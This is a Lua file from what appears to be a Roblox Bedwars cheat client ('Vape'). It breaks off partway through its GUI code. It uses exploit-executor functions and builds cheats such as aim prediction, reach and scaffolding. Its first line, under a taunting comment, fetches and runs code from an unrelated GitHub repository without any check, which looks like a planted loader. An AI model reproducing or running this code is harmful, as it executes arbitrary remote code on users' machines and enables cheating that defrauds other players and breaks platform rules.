--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
--[[
Ray Is Here
Skid Be like
Lmao
--]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/Hmm.lua"))()

local GuiLibrary = shared.GuiLibrary
local playersService = game:GetService("Players")
local textService = game:GetService("TextService")
local lightingService = game:GetService("Lighting")
local textChatService = game:GetService("TextChatService")
local inputService = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local collectionService = game:GetService("CollectionService")
local replicatedStorageService = game:GetService("ReplicatedStorage")
local gameCamera = workspace.CurrentCamera
local lplr = playersService.LocalPlayer
local vapeConnections = {}
local vapeCachedAssets = {}
local vapeEvents = setmetatable({}, {
	__index = function(self, index)
		self[index] = Instance.new("BindableEvent")
		return self[index]
	end
})
local vapeTargetInfo = shared.VapeTargetInfo
local vapeInjected = true

local bedwars = {}
local bedwarsStore = {
	attackReach = 0,
	attackReachUpdate = tick(),
	blocks = {},
	blockPlacer = {},
	blockPlace = tick(),
	blockRaycast = RaycastParams.new(),
	equippedKit = "none",
	forgeMasteryPoints = 0,
	forgeUpgrades = {},
	grapple = tick(),
	inventories = {},
	localInventory = {
		inventory = {
			items = {},
			armor = {}
		},
		hotbar = {}
	},
	localHand = {},
	matchState = 0,
	matchStateChanged = tick(),
	pots = {},
	queueType = "bedwars_test",
	scythe = tick(),
	statistics = {
		beds = 0,
		kills = 0,
		lagbacks = 0,
		lagbackEvent = Instance.new("BindableEvent"),
		reported = 0,
		universalLagbacks = 0
	},
	whitelist = {
		chatStrings1 = {helloimusinginhaler = "vape"},
		chatStrings2 = {vape = "helloimusinginhaler"},
		clientUsers = {},
		oldChatFunctions = {}
	},
	zephyrOrb = 0
}
bedwarsStore.blockRaycast.FilterType = Enum.RaycastFilterType.Include
local AutoLeave = {Enabled = false}

table.insert(vapeConnections, workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	gameCamera = workspace.CurrentCamera or workspace:FindFirstChildWhichIsA("Camera")
end))
local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local networkownerswitch = tick()
local isnetworkowner = isnetworkowner or function(part)
	local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
	if suc and res == Enum.NetworkOwnership.Manual then 
		sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Automatic)
		networkownerswitch = tick() + 8
	end
	return networkownerswitch <= tick()
end
local getcustomasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
local synapsev3 = syn and syn.toast_notification and "V3" or ""
local worldtoscreenpoint = function(pos)
	if synapsev3 == "V3" then 
		local scr = worldtoscreen({pos})
		return scr[1] - Vector3.new(0, 36, 0), scr[1].Z > 0
	end
	return gameCamera.WorldToScreenPoint(gameCamera, pos)
end
local worldtoviewportpoint = function(pos)
	if synapsev3 == "V3" then 
		local scr = worldtoscreen({pos})
		return scr[1], scr[1].Z > 0
	end
	return gameCamera.WorldToViewportPoint(gameCamera, pos)
end

local function vapeGithubRequest(scripturl)
	if not isfile("vape/"..scripturl) then
		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
		assert(suc, res)
		assert(res ~= "404: Not Found", res)
		if scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end
		writefile("vape/"..scripturl, res)
	end
	return readfile("vape/"..scripturl)
end

local function downloadVapeAsset(path)
	if not isfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = GuiLibrary.MainGui
			repeat task.wait() until isfile(path)
			textlabel:Destroy()
		end)
		local suc, req = pcall(function() return vapeGithubRequest(path:gsub("vape/assets", "assets")) end)
        if suc and req then
		    writefile(path, req)
        else
            return ""
        end
	end
	if not vapeCachedAssets[path] then vapeCachedAssets[path] = getcustomasset(path) end
	return vapeCachedAssets[path] 
end

local function warningNotification(title, text, delay)
	local suc, res = pcall(function()
		local frame = GuiLibrary.CreateNotification(title, text, delay, "assets/WarningNotification.png")
		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
		return frame
	end)
	return (suc and res)
end

local function runFunction(func) func() end

local function isFriend(plr, recolor)
	if GuiLibrary.ObjectsThatCanBeSaved["Use FriendsToggle"].Api.Enabled then
		local friend = table.find(GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.ObjectList, plr.Name)
		friend = friend and GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.ObjectListEnabled[friend]
		if recolor then
			friend = friend and GuiLibrary.ObjectsThatCanBeSaved["Recolor visualsToggle"].Api.Enabled
		end
		return friend
	end
	return nil
end

local function isTarget(plr)
	local friend = table.find(GuiLibrary.ObjectsThatCanBeSaved.TargetsListTextCircleList.Api.ObjectList, plr.Name)
	friend = friend and GuiLibrary.ObjectsThatCanBeSaved.TargetsListTextCircleList.Api.ObjectListEnabled[friend]
	return friend
end

local function isVulnerable(plr)
	return plr.Humanoid.Health > 0 and not plr.Character.FindFirstChildWhichIsA(plr.Character, "ForceField")
end

local function getPlayerColor(plr)
	if isFriend(plr, true) then
		return Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Friends ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Friends ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Friends ColorSliderColor"].Api.Value)
	end
	return tostring(plr.TeamColor) ~= "White" and plr.TeamColor.Color
end

local function LaunchAngle(v, g, d, h, higherArc)
	local v2 = v * v
	local v4 = v2 * v2
	local root = -math.sqrt(v4 - g*(g*d*d + 2*h*v2))
	return math.atan((v2 + root) / (g * d))
end

local function LaunchDirection(start, target, v, g)
	local horizontal = Vector3.new(target.X - start.X, 0, target.Z - start.Z)
	local h = target.Y - start.Y
	local d = horizontal.Magnitude
	local a = LaunchAngle(v, g, d, h)

	if a ~= a then 
		return g == 0 and (target - start).Unit * v
	end

	local vec = horizontal.Unit * v
	local rotAxis = Vector3.new(-horizontal.Z, 0, horizontal.X)
	return CFrame.fromAxisAngle(rotAxis, a) * vec
end

local physicsUpdate = 1 / 60

local function predictGravity(playerPosition, vel, bulletTime, targetPart, Gravity)
	local estimatedVelocity = vel.Y
	local rootSize = (targetPart.Humanoid.HipHeight + (targetPart.RootPart.Size.Y / 2))
	local velocityCheck = (tick() - targetPart.JumpTick) < 0.2
	vel = vel * physicsUpdate

	for i = 1, math.ceil(bulletTime / physicsUpdate) do 
		if velocityCheck then 
			estimatedVelocity = estimatedVelocity - (Gravity * physicsUpdate)
		else
			estimatedVelocity = 0
			playerPosition = playerPosition + Vector3.new(0, -0.03, 0) -- bw hitreg is so bad that I have to add this LOL
			rootSize = rootSize - 0.03
		end

		local floorDetection = workspace:Raycast(playerPosition, Vector3.new(vel.X, (estimatedVelocity * physicsUpdate) - rootSize, vel.Z), bedwarsStore.blockRaycast)
		if floorDetection then 
			playerPosition = Vector3.new(playerPosition.X, floorDetection.Position.Y + rootSize, playerPosition.Z)
			local bouncepad = floorDetection.Instance:FindFirstAncestor("gumdrop_bounce_pad")
			if bouncepad and bouncepad:GetAttribute("PlacedByUserId") == targetPart.Player.UserId then 
				estimatedVelocity = 130 - (Gravity * physicsUpdate)
				velocityCheck = true
			else
				estimatedVelocity = targetPart.Humanoid.JumpPower - (Gravity * physicsUpdate)
				velocityCheck = targetPart.Jumping
			end
		end

		playerPosition = playerPosition + Vector3.new(vel.X, velocityCheck and estimatedVelocity * physicsUpdate or 0, vel.Z)
	end

	return playerPosition, Vector3.new(0, 0, 0)
end

local entityLibrary = shared.vapeentity
local WhitelistFunctions = shared.vapewhitelist
local RunLoops = {RenderStepTable = {}, StepTable = {}, HeartTable = {}}
do
	function RunLoops:BindToRenderStep(name, func)
		if RunLoops.RenderStepTable[name] == nil then
			RunLoops.RenderStepTable[name] = runService.RenderStepped:Connect(func)
		end
	end

	function RunLoops:UnbindFromRenderStep(name)
		if RunLoops.RenderStepTable[name] then
			RunLoops.RenderStepTable[name]:Disconnect()
			RunLoops.RenderStepTable[name] = nil
		end
	end

	function RunLoops:BindToStepped(name, func)
		if RunLoops.StepTable[name] == nil then
			RunLoops.StepTable[name] = runService.Stepped:Connect(func)
		end
	end

	function RunLoops:UnbindFromStepped(name)
		if RunLoops.StepTable[name] then
			RunLoops.StepTable[name]:Disconnect()
			RunLoops.StepTable[name] = nil
		end
	end

	function RunLoops:BindToHeartbeat(name, func)
		if RunLoops.HeartTable[name] == nil then
			RunLoops.HeartTable[name] = runService.Heartbeat:Connect(func)
		end
	end

	function RunLoops:UnbindFromHeartbeat(name)
		if RunLoops.HeartTable[name] then
			RunLoops.HeartTable[name]:Disconnect()
			RunLoops.HeartTable[name] = nil
		end
	end
end

GuiLibrary.SelfDestructEvent.Event:Connect(function()
	vapeInjected = false
	for i, v in pairs(vapeConnections) do
		if v.Disconnect then pcall(function() v:Disconnect() end) continue end
		if v.disconnect then pcall(function() v:disconnect() end) continue end
	end
end)

local function getItem(itemName, inv)
	for slot, item in pairs(inv or bedwarsStore.localInventory.inventory.items) do
		if item.itemType == itemName then
			return item, slot
		end
	end
	return nil
end

local function getItemNear(itemName, inv)
	for slot, item in pairs(inv or bedwarsStore.localInventory.inventory.items) do
		if item.itemType == itemName or item.itemType:find(itemName) then
			return item, slot
		end
	end
	return nil
end

local function getHotbarSlot(itemName)
	for slotNumber, slotTable in pairs(bedwarsStore.localInventory.hotbar) do
		if slotTable.item and slotTable.item.itemType == itemName then
			return slotNumber - 1
		end
	end
	return nil
end

local function getShieldAttribute(char)
	local returnedShield = 0
	for attributeName, attributeValue in pairs(char:GetAttributes()) do 
		if attributeName:find("Shield") and type(attributeValue) == "number" then 
			returnedShield = returnedShield + attributeValue
		end
	end
	return returnedShield
end

local function getPickaxe()
	return getItemNear("pick")
end

local function getAxe()
	local bestAxe, bestAxeSlot = nil, nil
	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
		if item.itemType:find("axe") and item.itemType:find("pickaxe") == nil and item.itemType:find("void") == nil then
			bextAxe, bextAxeSlot = item, slot
		end
	end
	return bestAxe, bestAxeSlot
end

local function getSword()
	local bestSword, bestSwordSlot, bestSwordDamage = nil, nil, 0
	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
		local swordMeta = bedwars.ItemTable[item.itemType].sword
		if swordMeta then
			local swordDamage = swordMeta.damage or 0
			if swordDamage > bestSwordDamage then
				bestSword, bestSwordSlot, bestSwordDamage = item, slot, swordDamage
			end
		end
	end
	return bestSword, bestSwordSlot
end

local function getBow()
	local bestBow, bestBowSlot, bestBowStrength = nil, nil, 0
	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
		if item.itemType:find("bow") then 
			local tab = bedwars.ItemTable[item.itemType].projectileSource
			local ammo = tab.projectileType("arrow")	
			local dmg = bedwars.ProjectileMeta[ammo].combat.damage
			if dmg > bestBowStrength then
				bestBow, bestBowSlot, bestBowStrength = item, slot, dmg
			end
		end
	end
	return bestBow, bestBowSlot
end

local function getWool()
	local wool = getItemNear("wool")
	return wool and wool.itemType, wool and wool.amount
end

local function getBlock()
	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
		if bedwars.ItemTable[item.itemType].block then
			return item.itemType, item.amount
		end
	end
end

local function attackValue(vec)
	return {value = vec}
end

local function getSpeed()
	local speed = 0
	if lplr.Character then 
		local SpeedDamageBoost = lplr.Character:GetAttribute("SpeedBoost")
		if SpeedDamageBoost and SpeedDamageBoost > 1 then 
			speed = speed + (8 * (SpeedDamageBoost - 1))
		end
		if bedwarsStore.grapple > tick() then
			speed = speed + 90
		end
		if bedwarsStore.scythe > tick() then 
			speed = speed + 5
		end
		if lplr.Character:GetAttribute("GrimReaperChannel") then 
			speed = speed + 20
		end
		local armor = bedwarsStore.localInventory.inventory.armor[3]
		if type(armor) ~= "table" then armor = {itemType = ""} end
		if armor.itemType == "speed_boots" then 
			speed = speed + 12
		end
		if bedwarsStore.zephyrOrb ~= 0 then 
			speed = speed + 12
		end
	end
	return speed
end

local Reach = {Enabled = false}
local blacklistedblocks = {
	bed = true,
	ceramic = true
}
local cachedNormalSides = {}
for i,v in pairs(Enum.NormalId:GetEnumItems()) do if v.Name ~= "Bottom" then table.insert(cachedNormalSides, v) end end
local updateitem = Instance.new("BindableEvent")
local inputobj = nil
local tempconnection
tempconnection = inputService.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		inputobj = input
		tempconnection:Disconnect()
	end
end)
table.insert(vapeConnections, updateitem.Event:Connect(function(inputObj)
	if inputService:IsMouseButtonPressed(0) then
		game:GetService("ContextActionService"):CallFunction("block-break", Enum.UserInputState.Begin, inputobj)
	end
end))

local function getPlacedBlock(pos)
	local roundedPosition = bedwars.BlockController:getBlockPosition(pos)
	return bedwars.BlockController:getStore():getBlockAt(roundedPosition), roundedPosition
end

local oldpos = Vector3.zero

local function getScaffold(vec, diagonaltoggle)
	local realvec = Vector3.new(math.floor((vec.X / 3) + 0.5) * 3, math.floor((vec.Y / 3) + 0.5) * 3, math.floor((vec.Z / 3) + 0.5) * 3) 
	local speedCFrame = (oldpos - realvec)
	local returedpos = realvec
	if entityLibrary.isAlive then
		local angle = math.deg(math.atan2(-entityLibrary.character.Humanoid.MoveDirection.X, -entityLibrary.character.Humanoid.MoveDirection.Z))
		local goingdiagonal = (angle >= 130 and angle <= 150) or (angle <= -35 and angle >= -50) or (angle >= 35 and angle <= 50) or (angle <= -130 and angle >= -150)
		if goingdiagonal and ((speedCFrame.X == 0 and speedCFrame.Z ~= 0) or (speedCFrame.X ~= 0 and speedCFrame.Z == 0)) and diagonaltoggle then
			return oldpos
		end
	end
    return realvec
end

local function getBestTool(block)
	local tool = nil
	local blockmeta = bedwars.ItemTable[block]
	local blockType = blockmeta.block and blockmeta.block.breakType
	if blockType then
		local best = 0
		for i,v in pairs(bedwarsStore.localInventory.inventory.items) do
			local meta = bedwars.ItemTable[v.itemType]
			if meta.breakBlock and meta.breakBlock[blockType] and meta.breakBlock[blockType] >= best then
				best = meta.breakBlock[blockType]
				tool = v
			end
		end
	end
	return tool
end

local function getOpenApps()
	local count = 0
	for i,v in pairs(bedwars.AppController:getOpenApps()) do if (not tostring(v):find("Billboard")) and (not tostring(v):find("GameNametag")) then count = count + 1 end end
	return count
end

local function switchItem(tool)
	if lplr.Character.HandInvItem.Value ~= tool then
		bedwars.ClientHandler:Get(bedwars.EquipItemRemote):CallServerAsync({
			hand = tool
		})
		local started = tick()
		repeat task.wait() until (tick() - started) > 0.3 or lplr.Character.HandInvItem.Value == tool
	end
end

local function switchToAndUseTool(block, legit)
	local tool = getBestTool(block.Name)
	if tool and (entityLibrary.isAlive and lplr.Character:FindFirstChild("HandInvItem") and lplr.Character.HandInvItem.Value ~= tool.tool) then
		if legit then
			if getHotbarSlot(tool.itemType) then
				bedwars.ClientStoreHandler:dispatch({
					type = "InventorySelectHotbarSlot", 
					slot = getHotbarSlot(tool.itemType)
				})
				vapeEvents.InventoryChanged.Event:Wait()
				updateitem:Fire(inputobj)
				return true
			else
				return false
			end
		end
		switchItem(tool.tool)
	end
end

local function isBlockCovered(pos)
	local coveredsides = 0
	for i, v in pairs(cachedNormalSides) do
		local blockpos = (pos + (Vector3.FromNormalId(v) * 3))
		local block = getPlacedBlock(blockpos)
		if block then
			coveredsides = coveredsides + 1
		end
	end
	return coveredsides == #cachedNormalSides
end

local function GetPlacedBlocksNear(pos, normal)
	local blocks = {}
	local lastfound = nil
	for i = 1, 20 do
		local blockpos = (pos + (Vector3.FromNormalId(normal) * (i * 3)))
		local extrablock = getPlacedBlock(blockpos)
		local covered = isBlockCovered(blockpos)
		if extrablock then
			if bedwars.BlockController:isBlockBreakable({blockPosition = blockpos}, lplr) and (not blacklistedblocks[extrablock.Name]) then
				table.insert(blocks, extrablock.Name)
			end
			lastfound = extrablock
			if not covered then
				break
			end
		else
			break
		end
	end
	return blocks
end

local function getLastCovered(pos, normal)
	local lastfound, lastpos = nil, nil
	for i = 1, 20 do
		local blockpos = (pos + (Vector3.FromNormalId(normal) * (i * 3)))
		local extrablock, extrablockpos = getPlacedBlock(blockpos)
		local covered = isBlockCovered(blockpos)
		if extrablock then
			lastfound, lastpos = extrablock, extrablockpos
			if not covered then
				break
			end
		else
			break
		end
	end
	return lastfound, lastpos
end

local function getBestBreakSide(pos)
	local softest, softestside = 9e9, Enum.NormalId.Top
	for i,v in pairs(cachedNormalSides) do
		local sidehardness = 0
		for i2,v2 in pairs(GetPlacedBlocksNear(pos, v)) do	
			local blockmeta = bedwars.ItemTable[v2].block
			sidehardness = sidehardness + (blockmeta and blockmeta.health or 10)
            if blockmeta then
                local tool = getBestTool(v2)
                if tool then
                    sidehardness = sidehardness - bedwars.ItemTable[tool.itemType].breakBlock[blockmeta.breakType]
                end
            end
		end
		if sidehardness <= softest then
			softest = sidehardness
			softestside = v
		end	
	end
	return softestside, softest
end

local function EntityNearPosition(distance, ignore, overridepos)
	local closestEntity, closestMagnitude = nil, distance
	if entityLibrary.isAlive then
		for i, v in pairs(entityLibrary.entityList) do
			if not v.Targetable then continue end
            if isVulnerable(v) then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.RootPart.Position).magnitude
				if overridepos and mag > distance then
					mag = (overridepos - v.RootPart.Position).magnitude
				end
                if mag <= closestMagnitude then
					closestEntity, closestMagnitude = v, mag
                end
            end
        end
		if not ignore then
			for i, v in pairs(collectionService:GetTagged("Monster")) do
				if v.PrimaryPart and v:GetAttribute("Team") ~= lplr:GetAttribute("Team") then
					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
					if overridepos and mag > distance then 
						mag = (overridepos - v2.PrimaryPart.Position).magnitude
					end
					if mag <= closestMagnitude then
						closestEntity, closestMagnitude = {Player = {Name = v.Name, UserId = (v.Name == "Duck" and 2020831224 or 1443379645)}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
					end
				end
			end
			for i, v in pairs(collectionService:GetTagged("DiamondGuardian")) do
				if v.PrimaryPart then
					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
					if overridepos and mag > distance then 
						mag = (overridepos - v2.PrimaryPart.Position).magnitude
					end
					if mag <= closestMagnitude then
						closestEntity, closestMagnitude = {Player = {Name = "DiamondGuardian", UserId = 1443379645}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
					end
				end
			end
			for i, v in pairs(collectionService:GetTagged("GolemBoss")) do
				if v.PrimaryPart then
					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
					if overridepos and mag > distance then 
						mag = (overridepos - v2.PrimaryPart.Position).magnitude
					end
					if mag <= closestMagnitude then
						closestEntity, closestMagnitude = {Player = {Name = "GolemBoss", UserId = 1443379645}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
					end
				end
			end
			for i, v in pairs(collectionService:GetTagged("Drone")) do
				if v.PrimaryPart and tonumber(v:GetAttribute("PlayerUserId")) ~= lplr.UserId then
					local droneplr = playersService:GetPlayerByUserId(v:GetAttribute("PlayerUserId"))
					if droneplr and droneplr.Team == lplr.Team then continue end
					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
					if overridepos and mag > distance then 
						mag = (overridepos - v.PrimaryPart.Position).magnitude
					end
					if mag <= closestMagnitude then -- magcheck
						closestEntity, closestMagnitude = {Player = {Name = "Drone", UserId = 1443379645}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
					end
				end
			end
		end
	end
	return closestEntity
end

local function EntityNearMouse(distance)
	local closestEntity, closestMagnitude = nil, distance
    if entityLibrary.isAlive then
		local mousepos = inputService.GetMouseLocation(inputService)
		for i, v in pairs(entityLibrary.entityList) do
			if not v.Targetable then continue end
            if isVulnerable(v) then
				local vec, vis = worldtoscreenpoint(v.RootPart.Position)
				local mag = (mousepos - Vector2.new(vec.X, vec.Y)).magnitude
                if vis and mag <= closestMagnitude then
					closestEntity, closestMagnitude = v, v.Target and -1 or mag
                end
            end
        end
    end
	return closestEntity
end

local function AllNearPosition(distance, amount, sortfunction, prediction)
	local returnedplayer = {}
	local currentamount = 0
    if entityLibrary.isAlive then
		local sortedentities = {}
		for i, v in pairs(entityLibrary.entityList) do
			if not v.Targetable then continue end
            if isVulnerable(v) then
				local playerPosition = v.RootPart.Position
				local mag = (entityLibrary.character.HumanoidRootPart.Position - playerPosition).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - playerPosition).magnitude
				end
                if mag <= distance then
					table.insert(sortedentities, v)
                end
            end
        end
		for i, v in pairs(collectionService:GetTagged("Monster")) do
			if v.PrimaryPart then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
				end
                if mag <= distance then
					if v:GetAttribute("Team") == lplr:GetAttribute("Team") then continue end
                    table.insert(sortedentities, {Player = {Name = v.Name, UserId = (v.Name == "Duck" and 2020831224 or 1443379645), GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
                end
			end
		end
		for i, v in pairs(collectionService:GetTagged("DiamondGuardian")) do
			if v.PrimaryPart then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
				end
                if mag <= distance then
                    table.insert(sortedentities, {Player = {Name = "DiamondGuardian", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
                end
			end
		end
		for i, v in pairs(collectionService:GetTagged("GolemBoss")) do
			if v.PrimaryPart then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
				end
                if mag <= distance then
                    table.insert(sortedentities, {Player = {Name = "GolemBoss", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
                end
			end
		end
		for i, v in pairs(collectionService:GetTagged("Drone")) do
			if v.PrimaryPart then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
				end
                if mag <= distance then
					if tonumber(v:GetAttribute("PlayerUserId")) == lplr.UserId then continue end
					local droneplr = playersService:GetPlayerByUserId(v:GetAttribute("PlayerUserId"))
					if droneplr and droneplr.Team == lplr.Team then continue end
                    table.insert(sortedentities, {Player = {Name = "Drone", UserId = 1443379645}, GetAttribute = function() return "none" end, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
                end
			end
		end
		for i, v in pairs(bedwarsStore.pots) do
			if v.PrimaryPart then
				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
				if prediction and mag > distance then
					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
				end
                if mag <= distance then
                    table.insert(sortedentities, {Player = {Name = "Pot", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = {Health = 100, MaxHealth = 100}})
                end
			end
		end
		if sortfunction then
			table.sort(sortedentities, sortfunction)
		end
		for i,v in pairs(sortedentities) do 
			table.insert(returnedplayer, v)
			currentamount = currentamount + 1
			if currentamount >= amount then break end
		end
	end
	return returnedplayer
end

--pasted from old source since gui code is hard
local function CreateAutoHotbarGUI(children2, argstable)
	local buttonapi = {}
	buttonapi["Hotbars"] = {}
	buttonapi["CurrentlySelected"] = 1
	local currentanim
	local amount = #children2:GetChildren()
	local sortableitems = {
		{itemType = "swords", itemDisplayType = "diamond_sword"},
		{itemType = "pickaxes", itemDisplayType = "diamond_pickaxe"},
		{itemType = "axes", itemDisplayType = "diamond_axe"},
		{itemType = "shears", itemDisplayType = "shears"},
		{itemType = "wool", itemDisplayType = "wool_white"},
		{itemType = "iron", itemDisplayType = "iron"},
		{itemType = "diamond", itemDisplayType = "diamond"},
		{itemType = "emerald", itemDisplayType = "emerald"},
		{itemType = "bows", itemDisplayType = "wood_bow"},
	}
	local items = bedwars.ItemTable
	if items then
		for i2,v2 in pairs(items) do
			if (i2:find("axe") == nil or i2:find("void")) and i2:find("bow") == nil and i2:find("shears") == nil and i2:find("wool") == nil and v2.sword == nil and v2.armor == nil and v2["dontGiveItem"] == nil and bedwars.ItemTable[i2] and bedwars.ItemTable[i2].image then
				table.insert(sortableitems, {itemType = i2, itemDisplayType = i2})
			end
		end
	end
	local buttontext = Instance.new("TextButton")
	buttontext.AutoButtonColor = false
	buttontext.BackgroundTransparency = 1
	buttontext.Name = "ButtonText"
	buttontext.Text = ""
	buttontext.Name = argstable["Name"]
	buttontext.LayoutOrder = 1
	buttontext.Size = UDim2.new(1, 0, 0, 40)
	buttontext.Active = false
	buttontext.TextColor3 = Color3.fromRGB(162, 162, 162)
	buttontext.TextSize = 17
	buttontext.Font = Enum.Font.SourceSans
	buttontext.Position = UDim2.new(0, 0, 0, 0)
	buttontext.Parent = children2
	local toggleframe2 = Instance.new("Frame")
	toggleframe2.Size = UDim2.new(0, 200, 0, 31)
	toggleframe2.Position = UDim2.new(0, 10, 0, 4)
	toggleframe2.BackgroundColor3 = Color3.fromRGB(38, 37, 38)
	toggleframe2.Name = "ToggleFrame2"
	toggleframe2.Parent = buttontext
	local toggleframe1 = Instance.new("Frame")
	toggleframe1.Size = UDim2.new(0, 198, 0, 29)
	toggleframe1.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
	toggleframe1.BorderSizePixel = 0
	toggleframe1.Name = "ToggleFrame1"
	toggleframe1.Position = UDim2.new(0, 1, 0, 1)
	toggleframe1.Parent = toggleframe2
	local addbutton = Instance.new("ImageLabel")
	addbutton.BackgroundTransparency = 1
	addbutton.Name = "AddButton"
	addbutton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	addbutton.Position = UDim2.new(0, 93, 0, 9)
	addbutton.Size = UDim2.new(0, 12, 0, 12)
	addbutton.ImageColor3 = Color3.fromRGB(5, 133, 104)
	addbutton.Image = downloadVapeAsset("vape/assets/AddItem.png")
	addbutton.Parent = toggleframe1
	local children3 = Instance.new("Frame")
	children3.Name = argstable["Name"].."Children"
	children3.BackgroundTransparency = 1
	children3.LayoutOrder = amount
	children3.Size = UDim2.new(0, 220, 0, 0)
	children3.Parent = children2
	local uilistlayout = Instance.new("UIListLayout")
	uilistlayout.Parent = children3
	uilistlayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		children3.Size = UDim2.new(1, 0, 0, uilistlayout.AbsoluteContentSize.Y)
	end)
	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(0, 5)
	uicorner.Parent = toggleframe1
	local uicorner2 = Instance.new("UICorner")
	uicorner2.CornerRadius = UDim.new(0, 5)
	uicorner2.Parent = toggleframe2
	buttontext.MouseEnter:Connect(function()
		tweenService:Create(toggleframe2, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(79, 78, 79)}):Play()
	end)
	buttontext.MouseLeave:Connect(function()
		tweenService:Create(toggleframe2, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(38, 37, 38)}):Play()
	end)
	local ItemListBigFrame = Instance.new("Frame")
	ItemListBigFrame.Size = UDim2.new(1, 0, 1, 0)
	ItemListBigFrame.Name = "ItemList"
	ItemListBigFrame.BackgroundTransparency = 1
	ItemListBigFrame.Visible = false
	ItemListBigFrame.Parent = GuiLibrary.MainGui
	local ItemListFrame = Instance.new("Frame")
	ItemListFrame.Size = UDim2.new(0, 660, 0, 445)
	ItemListFrame.Position = UDim2.new(0.5, -330, 0.5, -223)
	ItemListFrame.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
	ItemListFrame.Parent = ItemListBigFrame
	local ItemListExitButton = Instance.new("ImageButton")
	ItemListExitButton.Name = "ItemListExitButton"
	ItemListExitButton.ImageColor3 = Color3.fromRGB(121, 121, 121)
	ItemListExitButton.Size = UDim2.new(0, 24, 0, 24)
	ItemListExitButton.AutoButtonColor = false
	ItemListExitButton.Image = downloadVapeAsset("vape/assets/ExitIcon1.png")
	ItemListExitButton.Visible = true
	ItemListExitButton.Position = UDim2.new(1, -31, 0, 8)
	ItemListExitButton.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
	ItemListExitButton.Parent = ItemListFrame
	local ItemListExitButtonround = Instance.new("UICorner")
